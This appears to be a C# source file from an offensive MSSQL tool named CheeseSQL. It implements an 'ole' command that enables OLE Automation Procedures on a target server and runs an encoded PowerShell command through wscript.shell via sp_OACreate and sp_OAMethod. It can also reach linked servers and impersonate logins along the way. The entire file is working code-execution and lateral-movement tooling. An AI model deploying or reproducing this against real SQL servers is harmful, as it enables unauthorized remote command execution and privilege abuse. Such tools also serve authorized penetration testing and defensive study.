﻿using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class ole : ICommand
    {
        public static string CommandName => "ole";

        public string Description()
        {
            return $"Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'";
        }

        public string Usage()
        {
            return $@"{Description()} 
Required arguments:
  /server:SERVER                   Server to connect to
  /command:<B64-PWSH>              Command to execute

Optional arguments:
  /target:TARGET                   Specify a linked SQL server as the target
  /db:DB                           Specify an alternate database to connect 
  /impersonate:USER                Impersonate a user on the connect server
  /impersonate-intermediate:USER   Impersonate a user on the intermediate server
  /impersonate-linked:USER         Impersonate a user on the target server
  /sqlauth                         If set, use SQL authentication
    /user:SQLUSER                  If /sqlauth, set the user for SQL authentication
    /password:SQLPASSWORD          If /sqlauth, set the password for SQL authentication";
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string connectInfo = "";
            string cmd = "";

            ArgumentSet argumentSet;
            try
            {
                argumentSet = ArgumentSet.FromDictionary(
                    arguments,
                    new List<string>() {
                        "/server",
                        "/command"
                    });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[x] Error: {e.Message}");
                return;
            }

            argumentSet.GetExtraString("/command", out cmd);

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, argumentSet.connectserver, argumentSet.database, argumentSet.sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            var procedures = new Dictionary<string, string>();

            if (!String.IsNullOrEmpty(argumentSet.impersonate))
            {
                procedures.Add($"Attempting impersonation as {argumentSet.impersonate}..", $"EXECUTE AS LOGIN = '{argumentSet.impersonate}';");
            }

            procedures.Add("Enabling OLE Automation Procedures..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");
            procedures.Add("Executing command..", $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc {cmd}';");
            procedures.Add("Disabling OLE Automation Procedures..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;");

            foreach (string step in procedures.Keys)
            {
                Console.WriteLine("[*] {0}", step);

                if (String.IsNullOrEmpty(argumentSet.target) && String.IsNullOrEmpty(argumentSet.intermediate))
                {
                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
                }
                else if (String.IsNullOrEmpty(argumentSet.intermediate))
                {
                    SQLExecutor.ExecuteLinkedProcedure(
                        connection, 
                        procedures[step],
                        argumentSet.target,
                        argumentSet.impersonate,
                        argumentSet.impersonate_linked
                        );
                }
                else
                {
                    SQLExecutor.ExecuteDoubleLinkedProcedure(
                        connection, 
                        procedures[step], 
                        argumentSet.target,
                        argumentSet.intermediate,
                        argumentSet.impersonate,
                        argumentSet.impersonate_linked,
                        argumentSet.impersonate_intermediate
                        );
                }
            }

            connection.Close();
        }
    }
}
